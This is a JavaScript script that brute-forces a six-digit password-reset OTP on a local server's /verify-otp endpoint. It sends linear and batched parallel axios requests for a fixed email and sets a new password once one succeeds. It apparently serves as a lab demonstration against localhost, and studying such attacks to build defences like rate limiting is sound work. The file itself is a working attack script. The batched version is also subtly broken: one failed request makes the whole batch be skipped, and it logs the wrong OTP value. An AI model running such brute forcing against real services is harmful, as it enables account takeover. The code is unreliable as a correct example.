import axios from "axios";

// Brute force attack - linear
const hackServer = async () => {
  for (let i = 100000; i < 999999; i++) {
    try {
      console.log(i.toString());
      const res = await axios.post("http://localhost:3000/verify-otp", {
        email: "vishal@gmail.com",
        otp: i.toString(),
        newPassword: "vishal123",
      });

      if (res.status === 200) {
        console.log(`OTP is ${i}`);
        break;
      }
    } catch (e) {
      continue;
    }
  }
};

// hackServer();

const hackServerBatch = async () => {
  for (let i = 100000; i < 1000000; i += 100) {
    let found = false;
    console.log(`Batch ${i}`);
    let requests = [];
    for (let j = 0; j < 100; j++) {
      const otp = i + j;
      const req = axios.post("http://localhost:3000/verify-otp", {
        email: "vishal@gmail.com",
        otp: otp.toString(),
        newPassword: "vishal123",
      });

      requests.push(req);
    }

    try {
      const res = await Promise.all(requests);
      for (let r of res) {
        if (r.status === 200) {
          console.log(`OTP is ${i}`);
          found = true;
        }
      }
    } catch (e) {
      continue;
    }

    if (found) {
      break;
    }
  }
};

hackServerBatch();

// single request
const sendRequest = async () => {
  const res = await axios.post("http://localhost:3000/verify-otp", {
    email: "vishal@gmail.com",
    otp: "190",
    newPassword: "vishal123",
  });

  console.log(res.data);
};
